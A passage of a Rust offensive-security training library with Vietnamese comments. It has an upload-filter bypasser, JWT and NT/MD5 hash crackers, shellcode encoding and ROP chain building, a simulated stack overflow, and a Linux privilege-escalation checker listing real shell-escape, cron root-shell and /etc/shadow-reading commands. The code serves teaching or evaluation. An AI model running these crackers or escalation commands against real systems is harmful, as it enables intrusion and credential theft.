    /// Giải thích kết quả.
    pub reason: String,
}

/// Bộ vượt kiểm duyệt tải lên tệp.
#[derive(Debug, Clone, PartialEq)]
pub struct FileUploadBypasser {
    /// Danh sách phần mở rộng bị chặn.
    pub blocked_extensions: Vec<String>,
}

impl FileUploadBypasser {
    /// Tạo bộ vượt kiểm duyệt với danh sách chặn cho trước.
    pub fn new(blocked_extensions: Vec<String>) -> Self {
        Self { blocked_extensions }
    }

    /// Danh sách phần mở rộng bị chặn mặc định.
    pub fn default_blocklist() -> Vec<String> {
        ["php", "phtml", "php3", "php4", "php5", "pht", "exe", "sh"]
            .iter()
            .map(|s| s.to_string())
            .collect()
    }

    /// Magic bytes nhận diện mã PHP.
    pub fn php_magic_bytes() -> Vec<u8> {
        b"<?php".to_vec()
    }

    /// Tạo tên tệp có phần mở rộng kép, ví dụ `shell.php.jpg`.
    pub fn double_extension(filename: &str) -> String {
        let stem = filename.split('.').next().unwrap_or("upload");
        format!("{stem}.php.jpg")
    }

    /// Thử vượt bộ lọc với một tệp giả định.
    pub fn try_bypass(
        &self,
        filename: &str,
        content_type: &str,
        content: &[u8],
    ) -> UploadBypassResult {
        let extension = filename
            .rsplit('.')
            .next()
            .unwrap_or("")
            .to_ascii_lowercase();
        let magic_bytes = if content.starts_with(b"<?php") {
            Self::php_magic_bytes()
        } else {
            Vec::new()
        };
        let blocked = self.blocked_extensions.iter().any(|e| e == &extension);
        let double = filename.split('.').any(|part| {
            self.blocked_extensions
                .iter()
                .any(|e| e.eq_ignore_ascii_case(part))
        });

        let (bypassed, reason) = if blocked {
            (
                false,
                format!(
                    "Phần mở rộng `.{extension}` nằm trong danh sách chặn — tải lên bị từ chối."
                ),
            )
        } else if double {
            (
                true,
                format!(
                    "Phần mở rộng cuối `.{extension}` được phép nhưng tên tệp chứa phần mở rộng bị chặn ở giữa — server có thể thực thi theo phần mở rộng trước."
                ),
            )
        } else if !magic_bytes.is_empty() {
            (
                true,
                "Nội dung chứa magic bytes PHP dù đuôi tệp được phép — nguy cơ thực thi mã từ xa."
                    .to_string(),
            )
        } else {
            (false, "Tệp không vượt qua được bộ lọc.".to_string())
        };

        UploadBypassResult {
            filename: filename.to_string(),
            extension,
            content_type: content_type.to_string(),
            magic_bytes,
            bypassed,
            reason,
        }
    }
}

impl Default for FileUploadBypasser {
    fn default() -> Self {
        Self::new(Self::default_blocklist())
    }
}

/// Một token JWT đã mã hoá.
#[derive(Debug, Clone, PartialEq)]
pub struct JwtToken {
    /// Phần header mã hoá Base64URL.
    pub header_b64: String,
    /// Phần payload mã hoá Base64URL.
    pub payload_b64: String,
    /// Phần chữ ký mã hoá Base64URL.
    pub signature_b64: String,
}

impl JwtToken {
    /// Tạo token từ ba chuỗi Base64URL.
    pub fn new(header_b64: &str, payload_b64: &str, signature_b64: &str) -> Self {
        Self {
            header_b64: header_b64.to_string(),
            payload_b64: payload_b64.to_string(),
            signature_b64: signature_b64.to_string(),
        }
    }

    /// Chuỗi đầu vào được ký: `header.payload`.
    pub fn signing_input(&self) -> String {
        format!("{}.{}", self.header_b64, self.payload_b64)
    }

    /// Ký một token HS256 bằng khoá bí mật.
    pub fn sign_with(header_b64: &str, payload_b64: &str, key: &[u8]) -> JwtToken {
        let signing_input = format!("{header_b64}.{payload_b64}");
        let mac = hmac_sha256(key, signing_input.as_bytes());
        JwtToken::new(header_b64, payload_b64, &encode_base64url(&mac))
    }

    /// Token dạng đầy đủ `header.payload.signature`.
    pub fn to_full_string(&self) -> String {
        format!(
            "{}.{}.{}",
            self.header_b64, self.payload_b64, self.signature_b64
        )
    }
}

/// Bộ bẻ khoá JWT (tấn công từ điển vào khoá HS256).
#[derive(Debug, Clone, PartialEq)]
pub struct JwtCracker {
    /// Từ điển mật khẩu ứng viên.
    pub wordlist: Vec<String>,
}

impl JwtCracker {
    /// Tạo bộ bẻ khoá với từ điển cho trước.
    pub fn new(wordlist: Vec<String>) -> Self {
        Self { wordlist }
    }

    /// Tìm khoá bí mật khớp với chữ ký của token.
    pub fn crack(&self, token: &JwtToken) -> Option<String> {
        let expected = decode_base64url(&token.signature_b64).ok()?;
        let signing_input = token.signing_input();
        let message = signing_input.as_bytes();
        for candidate in &self.wordlist {
            let mac = hmac_sha256(candidate.as_bytes(), message);
            if mac.as_slice() == expected.as_slice() {
                return Some(candidate.clone());
            }
        }
        None
    }

    /// Số phép thử đã thực hiện.
    pub fn attempts(&self) -> usize {
        self.wordlist.len()
    }

    /// Phát hiện token dùng thuật toán `none`.
    pub fn detect_alg_none(&self, token: &JwtToken) -> bool {
        let Ok(header) = decode_base64url(&token.header_b64) else {
            return false;
        };
        let text = String::from_utf8_lossy(&header).to_ascii_lowercase();
        text.contains("\"alg\":\"none\"") || text.contains("\"alg\": \"none\"")
    }
}

// ============================================================================
// 6. ĐỘNG CƠ KHAI THÁC NHỊ PHÂN (MIRROR CHƯƠNG 98)
// ============================================================================

/// Kích thước khung ngăn xếp mô phỏng (byte).
pub const BUFFER_SIZE: usize = 64;

/// Bộ sinh mẫu tuần hoàn kiểu De Bruijn để tìm offset ghi đè.
#[derive(Debug, Clone, PartialEq)]
pub struct CyclicPatternGenerator {
    /// Bảng chữ cái của chu kỳ.
    pub alphabet: Vec<u8>,
    /// Độ dài một chu kỳ.
    pub cycle_len: usize,
}

impl CyclicPatternGenerator {
    /// Tạo bộ sinh với chu kỳ 3 ký tự trên 62 ký tự cơ sở (186 byte).
    pub fn new() -> Self {
        const BASE: &[u8; 62] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let mut alphabet = Vec::with_capacity(186);
        for (i, ch) in BASE.iter().enumerate() {
            alphabet.push(*ch);
            alphabet.push(ch.to_ascii_lowercase());
            alphabet.push(b'0' + (i % 10) as u8);
        }
        let cycle_len = alphabet.len();
        Self {
            alphabet,
            cycle_len,
        }
    }

    /// Sinh `length` byte theo chu kỳ.
    pub fn generate(&self, length: usize) -> Vec<u8> {
        if self.alphabet.is_empty() {
            return Vec::new();
        }
        (0..length)
            .map(|i| self.alphabet[i % self.cycle_len])
            .collect()
    }

    /// Tìm offset mà chuỗi quan sát bắt đầu trong mẫu tuần hoàn.
    pub fn find_offset(&self, sequence: &[u8]) -> Option<usize> {
        if sequence.is_empty() || self.alphabet.is_empty() {
            return None;
        }
        let buffer = self.generate(sequence.len() + self.cycle_len);
        buffer
            .windows(sequence.len())
            .position(|window| window == sequence)
    }

    /// Số byte tối thiểu cần gửi để phủ một offset.
    pub fn pattern_size_for_offset(&self, offset: usize) -> usize {
        offset + 4
    }

    /// Kiểm tra chuỗi con tại offset có khớp với chuỗi quan sát hay không.
    pub fn verify_offset(&self, offset: usize, observed: &[u8]) -> bool {
        let buffer = self.generate(offset + observed.len());
        buffer[offset..offset + observed.len()] == *observed
    }

    /// Nhãn 4 ký tự để đọc offset trong hex dump.
    pub fn chunk_label(&self, offset: usize) -> String {
        let chunk = self.generate(offset + 4);
        String::from_utf8_lossy(&chunk[offset..offset + 4]).to_string()
    }
}

impl Default for CyclicPatternGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// Bộ mã hoá/giải mã shellcode bằng XOR xoay vòng.
#[derive(Debug, Clone, PartialEq)]
pub struct ShellcodeEncoder {
    /// Khoá XOR.
    pub key: Vec<u8>,
}

impl ShellcodeEncoder {
    /// Tạo bộ mã hoá với khoá cho trước.
    pub fn new(key: Vec<u8>) -> Self {
        Self { key }
    }

    /// Mã hoá shellcode.
    pub fn xor_encode(&self, shellcode: &[u8]) -> Vec<u8> {
        if self.key.is_empty() {
            return shellcode.to_vec();
        }
        shellcode
            .iter()
            .enumerate()
            .map(|(i, byte)| byte ^ self.key[i % self.key.len()])
            .collect()
    }

    /// Giải mã dữ liệu đã mã hoá (XOR là phép nghịch đảo của chính nó).
    pub fn xor_decode(&self, data: &[u8]) -> Vec<u8> {
        self.xor_encode(data)
    }
}

/// Bộ dựng chuỗi ROP.
#[derive(Debug, Clone, PartialEq)]
pub struct RopChainBuilder {
    /// Danh sách gadget `(địa chỉ, tham số tùy chọn)`.
    pub gadgets: Vec<(u64, Option<u64>)>,
    /// Địa chỉ nền của vùng nhớ đích.
    pub base_address: u64,
}

impl RopChainBuilder {
    /// Tạo bộ dựng chuỗi ROP.
    pub fn new(base_address: u64) -> Self {
        Self {
            gadgets: Vec::new(),
            base_address,
        }
    }

    /// Thêm một gadget (và tham số tuỳ chọn) vào chuỗi.
    pub fn add_gadget(&mut self, gadget_address: u64, argument: Option<u64>) -> &mut Self {
        self.gadgets.push((gadget_address, argument));
        self
    }

    /// Dựng chuỗi byte của chuỗi ROP (mỗi gadget 8 byte little-endian).
    pub fn build(&self) -> Vec<u8> {
        let mut out = Vec::new();
        for (address, argument) in &self.gadgets {
            out.extend_from_slice(&address.to_le_bytes());
            if let Some(value) = argument {
                out.extend_from_slice(&value.to_le_bytes());
            }
        }
        out
    }

    /// Số gadget trong chuỗi.
    pub fn chain_length(&self) -> usize {
        self.gadgets.len()
    }
}

/// Bộ đệm nhị phân có lỗ hổng tràn bộ đệm (mô phỏng an toàn).
///
/// Khung ngăn xếp mô phỏng gồm: `buffer[64] | canary[8] | saved_rbp[8] | return_address[8]`.
/// Việc ghi tràn được mô phỏng hoàn toàn bằng Rust an toàn — không dùng `unsafe`.
#[derive(Debug, Clone, PartialEq)]
pub struct VulnerableBuffer {
    /// Vùng đệm dữ liệu.
    pub buffer: [u8; BUFFER_SIZE],
    /// Giá trị canary.
    pub canary_value: u64,
    /// Địa chỉ khung trước đã lưu.
    pub saved_rbp: u64,
    /// Địa chỉ trả về.
    pub return_address: u64,
}

impl VulnerableBuffer {
    /// Tạo bộ đệm với canary và địa chỉ trả về mặc định.
    pub fn new() -> Self {
        Self {
            buffer: [0u8; BUFFER_SIZE],
            canary_value: 0x0000_DEAD_BEEF_CAFE_1234,
            saved_rbp: 0x0000_0000_0000_0000,
            return_address: 0x0040_1000,
        }
    }

    /// Ghi dữ liệu vào bộ đệm; trả `true` nếu vừa khít, `false` nếu tràn.
    pub fn write_input(&mut self, data: &[u8]) -> bool {
        let len = data.len();
        let copy = len.min(BUFFER_SIZE);
        self.buffer[..copy].copy_from_slice(&data[..copy]);
        if len <= BUFFER_SIZE {
            return true;
        }

        let overflow = &data[BUFFER_SIZE..];
        if overflow.len() >= 8 {
            let mut canary = [0u8; 8];
            canary.copy_from_slice(&overflow[..8]);
            self.canary_value = u64::from_le_bytes(canary);
        }
        if overflow.len() >= 16 {
            let mut rbp = [0u8; 8];
            rbp.copy_from_slice(&overflow[8..16]);
            self.saved_rbp = u64::from_le_bytes(rbp);
        }
        if overflow.len() >= 24 {
            let mut ret = [0u8; 8];
            ret.copy_from_slice(&overflow[16..24]);
            self.return_address = u64::from_le_bytes(ret);
        }
        false
    }

    /// Canary còn nguyên hay không.
    pub fn is_canary_intact(&self) -> bool {
        self.canary_value == 0x0000_DEAD_BEEF_CAFE_1234
    }

    /// Địa chỉ trả về đã bị ghi đè hay chưa.
    pub fn did_overwrite_return_address(&self) -> bool {
        self.return_address != 0x0040_1000
    }

    /// Mô phỏng lệnh `ret`: trả về địa chỉ trả về hiện tại.
    pub fn trigger(&self) -> u64 {
        self.return_address
    }

    /// Vị trí của canary trong khung ngăn xếp.
    pub fn canary_position(&self) -> usize {
        BUFFER_SIZE
    }

    /// Mô tả bố cục khung ngăn xếp `(tên, offset, kích thước)`.
    pub fn stack_frame_layout() -> Vec<(&'static str, usize, usize)> {
        vec![
            ("buffer", 0, BUFFER_SIZE),
            ("canary", BUFFER_SIZE, 8),
            ("saved_rbp", BUFFER_SIZE + 8, 8),
            ("return_address", BUFFER_SIZE + 16, 8),
        ]
    }
}

impl Default for VulnerableBuffer {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// 7. ĐỘNG CƠ TẤN CÔNG THÔNG TIN XÁC THỰC (MIRROR CHƯƠNG 101)
// ============================================================================

/// Tính NT hash của một mật khẩu (MD4 trên mã hoá UTF-16LE theo MS-NLMP).
pub fn nt_hash(password: &str) -> [u8; 16] {
    let mut utf16 = Vec::with_capacity(password.len() * 2);
    for unit in password.encode_utf16() {
        utf16.extend_from_slice(&unit.to_le_bytes());
    }
    md4(&utf16)
}

/// NT hash ở dạng hex viết thường.
pub fn nt_hash_hex(password: &str) -> String {
    to_hex(&nt_hash(password))
}

/// MD5 ở dạng hex viết thường.
pub fn md5_hex(data: &[u8]) -> String {
    to_hex(&md5(data))
}

/// Thuật toán băm được hỗ trợ khi bẻ khoá.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HashAlgorithm {
    /// MD5 (RFC 1321).
    Md5,
    /// NT hash (MD4/UTF-16LE).
    NtHash,
    /// SHA-256 (FIPS 180-4).
    Sha256,
}

impl HashAlgorithm {
    /// Tính mã băm của một mật khẩu theo thuật toán tương ứng (dạng hex).
    pub fn hash(&self, candidate: &str) -> String {
        match self {
            HashAlgorithm::Md5 => md5_hex(candidate.as_bytes()),
            HashAlgorithm::NtHash => nt_hash_hex(candidate),
            HashAlgorithm::Sha256 => to_hex(&sha256(candidate.as_bytes())),
        }
    }
}

/// Bộ bẻ khoá mật khẩu bằng từ điển.
#[derive(Debug, Clone, PartialEq)]
pub struct HashCracker {
    /// Từ điển mật khẩu ứng viên.
    pub wordlist: Vec<String>,
    /// Thuật toán băm đang nhắm tới.
    pub algorithm: HashAlgorithm,
}

impl HashCracker {
    /// Tạo bộ bẻ khoá với từ điển cho trước (mặc định NT hash).
    pub fn new(wordlist: Vec<String>) -> Self {
        Self {
            wordlist,
            algorithm: HashAlgorithm::NtHash,
        }
    }

    /// Tạo bộ bẻ khoá với thuật toán chỉ định.
    pub fn with_algorithm(wordlist: Vec<String>, algorithm: HashAlgorithm) -> Self {
        Self {
            wordlist,
            algorithm,
        }
    }

    /// Tìm mật khẩu tương ứng với mã băm hex đích.
    pub fn crack(&self, target: &str) -> Option<String> {
        let target = target.trim().to_ascii_lowercase();
        for candidate in &self.wordlist {
            if self.algorithm.hash(candidate) == target {
                return Some(candidate.clone());
            }
        }
        None
    }

    /// Số phép thử đã thực hiện.
    pub fn attempts(&self) -> usize {
        self.wordlist.len()
    }
}

/// Quy tắc biến thể từ điển mật khẩu.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MutationRule {
    /// Viết hoa chữ cái đầu.
    UppercaseFirst,
    /// Viết hoa chữ cái đầu, còn lại viết thường.
    Capitalize,
    /// Thay ký tự bằng ký tự leet.
    Leet,
    /// Thêm hậu tố số.
    AppendDigits,
    /// Thêm hậu tố ký tự đặc biệt.
    AppendSpecial,
    /// Đảo ngược chuỗi.
    Reverse,
    /// Nhân đôi chuỗi.
    Duplicate,
}

/// Bộ sinh biến thể từ điển mật khẩu.
#[derive(Debug, Clone, PartialEq)]
pub struct WordlistMutator {
    /// Danh sách quy tắc áp dụng.
    pub rules: Vec<MutationRule>,
    /// Số lượng hậu tố số tối đa.
    pub max_digits: u32,
    /// Danh sách ký tự đặc biệt dùng làm hậu tố.
    pub specials: Vec<char>,
}

impl WordlistMutator {
    /// Tạo bộ biến thể với bộ quy tắc mặc định.
    pub fn new() -> Self {
        Self {
            rules: vec![
                MutationRule::UppercaseFirst,
                MutationRule::Capitalize,
                MutationRule::Leet,
                MutationRule::AppendDigits,
                MutationRule::AppendSpecial,
            ],
            max_digits: 9,
            specials: vec!['!', '@', '#', '$'],
        }
    }

    /// Sinh toàn bộ biến thể của một từ.
    pub fn generate(&self, word: &str) -> Vec<String> {
        let mut out = Vec::new();
        for rule in &self.rules {
            match rule {
                MutationRule::UppercaseFirst => out.push(uppercase_first(word)),
                MutationRule::Capitalize => out.push(capitalize(word)),
                MutationRule::Leet => out.push(Self::leet(word)),
                MutationRule::AppendDigits => {
                    out.extend(Self::append_digits(word, self.max_digits))
                }
                MutationRule::AppendSpecial => {
                    out.extend(Self::append_specials(word, &self.specials));
                }
                MutationRule::Reverse => out.push(word.chars().rev().collect()),
                MutationRule::Duplicate => out.push(format!("{word}{word}")),
            }
        }
        out
    }

    /// Sinh biến thể của cả danh sách từ.
    pub fn generate_all(&self, words: &[String]) -> Vec<String> {
        let mut out = Vec::new();
        for word in words {
            out.extend(self.generate(word));
        }
        out
    }

    /// Biến thể leet: `a→@, e→3, i→1, o→0, s→$`.
    pub fn leet(word: &str) -> String {
        word.chars()
            .map(|c| match c {
                'a' => '@',
                'e' => '3',
                'i' => '1',
                'o' => '0',
                's' => '$',
                other => other,
            })
            .collect()
    }

    /// Sinh hậu tố số từ 1 đến `max`.
    pub fn append_digits(word: &str, max: u32) -> Vec<String> {
        (1..=max).map(|i| format!("{word}{i}")).collect()
    }

    /// Sinh hậu tố ký tự đặc biệt.
    pub fn append_specials(word: &str, specials: &[char]) -> Vec<String> {
        specials.iter().map(|s| format!("{word}{s}")).collect()
    }

    /// Thêm hậu tố `123` cố định.
    pub fn with_digits(word: &str) -> String {
        format!("{word}123")
    }
}

impl Default for WordlistMutator {
    fn default() -> Self {
        Self::new()
    }
}

/// Viết hoa chữ cái đầu tiên.
fn uppercase_first(word: &str) -> String {
    let mut chars = word.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
        None => String::new(),
    }
}

/// Viết hoa chữ cái đầu, phần còn lại viết thường.
fn capitalize(word: &str) -> String {
    let mut chars = word.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().collect::<String>() + &chars.as_str().to_lowercase(),
        None => String::new(),
    }
}
// ============================================================================
// 8. ĐỘNG CƠ LEO THANG ĐẶC QUYỀN (MIRROR CHƯƠNG 102)
// ============================================================================

/// Nền tảng mà một phát hiện leo thang đặc quyền áp dụng.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Platform {
    /// Hệ điều hành Linux.
    Linux,
    /// Hệ điều hành Windows.
    Windows,
    /// Áp dụng cho cả hai.
    Both,
}

/// Một phát hiện leo thang đặc quyền.
#[derive(Debug, Clone, PartialEq)]
pub struct Finding {
    /// Tên kỹ thuật (ví dụ `SuidBinary`).
    pub technique: String,
    /// Tiêu đề mô tả.
    pub title: String,
    /// Mức độ nghiêm trọng.
    pub severity: Severity,
    /// Nền tảng áp dụng.
    pub platform: Platform,
    /// Đường dẫn/tài nguyên liên quan.
    pub path: String,
    /// Mô tả chi tiết.
    pub detail: String,
    /// Lệnh khai thác gợi ý.
    pub exploit_command: String,
    /// Bằng chứng thu thập được.
    pub evidence: String,
}

impl Finding {
    /// Tạo phát hiện với các trường cơ bản.
    pub fn new(technique: &str, title: &str, severity: Severity, platform: Platform) -> Self {
        Self {
            technique: technique.to_string(),
            title: title.to_string(),
            severity,
            platform,
            path: String::new(),
            detail: String::new(),
            exploit_command: String::new(),
            evidence: String::new(),
        }
    }
}

/// Cờ SUID trong chế độ tệp Unix.
pub const S_IFUID: u32 = 0o4000;

/// Cờ SGID trong chế độ tệp Unix.
pub const S_IFGID: u32 = 0o2000;

/// Một tệp trong hệ thống tệp mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct MockFile {
    /// Đường dẫn tuyệt đối.
    pub path: PathBuf,
    /// Nội dung tệp.
    pub content: Vec<u8>,
    /// Chế độ tệp (quyền + cờ đặc biệt).
    pub mode: u32,
    /// Chủ sở hữu.
    pub owner: String,
    /// Nhóm sở hữu.
    pub group: String,
    /// Có phải liên kết tượng hay không.
    pub is_symlink: bool,
    /// Đích của liên kết tượng.
    pub symlink_target: Option<PathBuf>,
}

/// Hệ thống tệp mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct MockFilesystem {
    /// Các tệp theo đường dẫn.
    pub files: HashMap<PathBuf, MockFile>,
    /// Các thư mục.
    pub dirs: HashSet<PathBuf>,
}

impl MockFilesystem {
    /// Tạo hệ thống tệp rỗng.
    pub fn new() -> Self {
        Self {
            files: HashMap::new(),
            dirs: HashSet::new(),
        }
    }

    /// Thêm một tệp.
    pub fn add_file(&mut self, path: &str, content: &[u8], mode: u32, owner: &str) -> &mut Self {
        let path_buf = PathBuf::from(path);
        self.files.insert(
            path_buf.clone(),
            MockFile {
                path: path_buf,
                content: content.to_vec(),
                mode,
                owner: owner.to_string(),
                group: owner.to_string(),
                is_symlink: false,
                symlink_target: None,
            },
        );
        self
    }

    /// Thêm một thư mục.
    pub fn add_dir(&mut self, path: &str, mode: u32) -> &mut Self {
        self.dirs.insert(PathBuf::from(path));
        let _ = mode;
        self
    }

    /// Thêm một liên kết tượng.
    pub fn add_symlink(&mut self, path: &str, target: &str) -> &mut Self {
        let path_buf = PathBuf::from(path);
        self.files.insert(
            path_buf.clone(),
            MockFile {
                path: path_buf,
                content: Vec::new(),
                mode: 0o777,
                owner: "root".to_string(),
                group: "root".to_string(),
                is_symlink: true,
                symlink_target: Some(PathBuf::from(target)),
            },
        );
        self
    }

    /// Lấy thông tin một tệp.
    pub fn get(&self, path: &str) -> Option<&MockFile> {
        self.files.get(&PathBuf::from(path))
    }

    /// Tệp có tồn tại không.
    pub fn exists(&self, path: &str) -> bool {
        self.files.contains_key(&PathBuf::from(path)) || self.dirs.contains(&PathBuf::from(path))
    }

    /// Tệp có cờ SUID không.
    pub fn is_suid(&self, path: &str) -> bool {
        self.get(path)
            .map(|f| f.mode & S_IFUID != 0)
            .unwrap_or(false)
    }

    /// Tệp có cờ SGID không.
    pub fn is_sgid(&self, path: &str) -> bool {
        self.get(path)
            .map(|f| f.mode & S_IFGID != 0)
            .unwrap_or(false)
    }

    /// Tệp có quyền ghi cho mọi người không.
    pub fn is_world_writable(&self, path: &str) -> bool {
        self.get(path).map(|f| f.mode & 0o002 != 0).unwrap_or(false)
    }

    /// Người dùng có quyền ghi lên tệp không.
    pub fn is_writable_by(&self, path: &str, user: &str) -> bool {
        let Some(file) = self.get(path) else {
            return false;
        };
        if file.owner == user {
            return file.mode & 0o200 != 0;
        }
        if file.group == user {
            return file.mode & 0o020 != 0;
        }
        file.mode & 0o002 != 0
    }

    /// Danh sách đường dẫn của mọi tệp.
    pub fn path_list(&self) -> Vec<PathBuf> {
        let mut paths: Vec<PathBuf> = self.files.keys().cloned().collect();
        paths.sort();
        paths
    }

    /// Giải mã liên kết tượng một cấp.
    pub fn resolve_symlink(&self, path: &str) -> Option<PathBuf> {
        let file = self.get(path)?;
        file.symlink_target.clone()
    }
}

impl Default for MockFilesystem {
    fn default() -> Self {
        Self::new()
    }
}

/// Một khoá trong sổ đăng ký Windows mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct RegistryKey {
    /// Đường dẫn khoá.
    pub path: String,
    /// Các cặp tên/giá trị.
    pub values: HashMap<String, String>,
    /// Danh sách khoá con.
    pub subkeys: Vec<String>,
}

/// Sổ đăng ký Windows mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct MockRegistry {
    /// Các khoá theo đường dẫn.
    pub keys: HashMap<String, RegistryKey>,
}

impl MockRegistry {
    /// Tạo sổ đăng ký rỗng.
    pub fn new() -> Self {
        Self {
            keys: HashMap::new(),
        }
    }

    /// Tạo một khoá.
    pub fn create_key(&mut self, path: &str) -> &mut Self {
        self.keys.entry(path.to_string()).or_insert(RegistryKey {
            path: path.to_string(),
            values: HashMap::new(),
            subkeys: Vec::new(),
        });
        self
    }

    /// Đặt một giá trị trong khoá.
    pub fn set_value(&mut self, key_path: &str, name: &str, value: &str) -> &mut Self {
        let entry = self
            .keys
            .entry(key_path.to_string())
            .or_insert(RegistryKey {
                path: key_path.to_string(),
                values: HashMap::new(),
                subkeys: Vec::new(),
            });
        entry.values.insert(name.to_string(), value.to_string());
        self
    }

    /// Đọc một giá trị trong khoá.
    pub fn get_value(&self, key_path: &str, name: &str) -> Option<&str> {
        self.keys
            .get(key_path)?
            .values
            .get(name)
            .map(|s| s.as_str())
    }

    /// Khoá có tồn tại không.
    pub fn key_exists(&self, path: &str) -> bool {
        self.keys.contains_key(path)
    }

    /// Danh sách toàn bộ đường dẫn khoá.
    pub fn all_keys(&self) -> Vec<String> {
        let mut keys: Vec<String> = self.keys.keys().cloned().collect();
        keys.sort();
        keys
    }
}

impl Default for MockRegistry {
    fn default() -> Self {
        Self::new()
    }
}

/// Bộ kiểm tra leo thang đặc quyền trên Linux.
#[derive(Debug, Clone, PartialEq)]
pub struct LinuxPrivEscChecker {
    /// Hệ thống tệp mô phỏng.
    pub fs: MockFilesystem,
    /// Các phát hiện đã thu thập.
    pub findings: Vec<Finding>,
}

impl LinuxPrivEscChecker {
    /// Tạo bộ kiểm tra trên một hệ thống tệp cho trước.
    pub fn new(fs: MockFilesystem) -> Self {
        Self {
            fs,
            findings: Vec::new(),
        }
    }

    /// Chạy toàn bộ các kiểm tra.
    pub fn scan(&mut self) -> Vec<Finding> {
        let mut all = Vec::new();
        all.extend(self.check_suid_binaries());
        all.extend(self.check_cron_jobs());
        all.extend(self.check_capabilities());
        all.extend(self.check_world_writable_paths());
        self.findings = all.clone();
        all
    }

    /// Dò nhị phân có cờ SUID.
    pub fn check_suid_binaries(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in self.fs.files.values() {
            if file.mode & S_IFUID == 0 {
                continue;
            }
            let mut finding = Finding::new(
                "SuidBinary",
                &format!("Nhị phân SUID: {}", file.path.display()),
                Severity::High,
                Platform::Linux,
            );
            finding.path = file.path.display().to_string();
            finding.detail = format!(
                "Tệp `{}` thuộc sở hữu của `{}` và có cờ SUID, cho phép thực thi với quyền của chủ sở hữu.",
                file.path.display(),
                file.owner
            );
            finding.exploit_command = "find . -exec /bin/sh -p \\; \\;".to_string();
            finding.evidence = format!("mode={:o} owner={}", file.mode, file.owner);
            out.push(finding);
        }
        out
    }

    /// Dò công việc cron không kiểm soát được.
    pub fn check_cron_jobs(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in self.fs.files.values() {
            let path = file.path.display().to_string();
            if !(path.contains("/cron/") || path.contains("/crontab")) {
                continue;
            }
            let content = String::from_utf8_lossy(&file.content).to_string();
            if !content.contains("@reboot")
                && !content.contains("/bin/sh")
                && !content.contains("/bin/bash")
            {
                continue;
            }
            let mut finding = Finding::new(
                "CronJob",
                &format!("Cron job không an toàn: {path}"),
                Severity::High,
                Platform::Linux,
            );
            finding.path = path.clone();
            finding.detail =
                "Tác nhân thấp có thể chỉnh sửa tệp cron để thực thi lệnh với quyền root."
                    .to_string();
            finding.exploit_command = format!("echo '* * * * * root /bin/bash -i' >> {path}");
            finding.evidence = content.lines().next().unwrap_or("").to_string();
            out.push(finding);
        }
        out
    }

    /// Dò tệp mang capability đặc biệt.
    ///
    /// Quy ước mô phỏng: tệp có nội dung bắt đầu bằng `CAP_` được coi là mang capability.
    pub fn check_capabilities(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in self.fs.files.values() {
            let content = String::from_utf8_lossy(&file.content);
            if !content.starts_with("CAP_") {
                continue;
            }
            let mut finding = Finding::new(
                "Capabilities",
                &format!("File capability nguy hiểm: {}", file.path.display()),
                Severity::High,
                Platform::Linux,
            );
            finding.path = file.path.display().to_string();
            finding.detail = format!(
                "Tệp `{}` mang capability `{}` cho phép vượt qua nhiều giới hạn bảo mật.",
                file.path.display(),
                content.lines().next().unwrap_or("")
            );
            finding.exploit_command = "capsh --print".to_string();
            finding.evidence = content.lines().next().unwrap_or("").to_string();
            out.push(finding);
        }
        out
    }

    /// Dò tệp/thư mục ghi được bởi mọi người.
    pub fn check_world_writable_paths(&mut self) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in self.fs.files.values() {
            if file.mode & 0o002 == 0 {
                continue;
            }
            let mut finding = Finding::new(
                "WorldWritablePath",
                &format!("Tệp ghi được bởi mọi người: {}", file.path.display()),
                Severity::Medium,
                Platform::Linux,
            );
            finding.path = file.path.display().to_string();
            finding.detail = "Bất kỳ người dùng nào cũng có thể ghi đè tệp này.".to_string();
            finding.exploit_command = format!("echo '#!/bin/sh' > {}", file.path.display());
            finding.evidence = format!("mode={:o}", file.mode);
            out.push(finding);
        }
        out
    }

    /// Bảng kỹ thuật GTFOBins rút gọn.
    pub fn gtfo_bins() -> Vec<(&'static str, &'static str)> {
        vec![
            ("find", "find . -exec /bin/sh -p \\; \\;"),
            ("vim", "vim -c ':!/bin/sh'"),
            ("perl", "perl -e 'exec \"/bin/sh\";'"),
            ("python", "python -c 'import os; os.system(\"/bin/sh\")'"),
            ("awk", "awk 'BEGIN {system(\"/bin/sh\")}'"),
            ("less", "less"),
            ("nmap", "nmap --interactive"),
            ("tar", "tar cf /dev/shm/x.tar --checkpoint=1 --exec=/bin/sh"),
            ("zip", "zip /tmp/x.zip /etc/passwd"),
            (
                "docker",
                "docker run -v /:/host --privileged -it alpine chroot /host",
            ),
            ("man", "man -k /bin/sh"),
            ("git", "git -c core.pager='cat /etc/shadow'"),
        ]
    }
}

/// Kết quả kiểm chứng sự thật nền.
#[derive(Debug, Clone, PartialEq)]
pub struct VerificationResult {
    /// Phát hiện có đúng hay không.
    pub verified: bool,
    /// Bằng chứng thô.
    pub proof: String,
    /// Phương pháp kiểm chứng.
    pub method: String,
    /// Chi tiết bổ sung.
    pub details: String,
}

/// Bộ kiểm chứng sự thật nền — không bao giờ tin lời khai của tác nhân.
#[derive(Debug, Clone, PartialEq)]
pub struct GroundTruthVerifier {
    /// Người dùng kỳ vọng sau khi leo thang.
    pub expected_user: String,
}

impl GroundTruthVerifier {
    /// Tạo bộ kiểm chứng với người dùng kỳ vọng.
    pub fn new(expected_user: &str) -> Self {
        Self {
            expected_user: expected_user.to_string(),
        }
    }

    /// Kiểm chứng trạng thái hiện tại của một shell.
    ///
    /// Bất biến cốt lõi: **không** tin lời khai của tác nhân. Hệ thống dùng bằng chứng thực thi
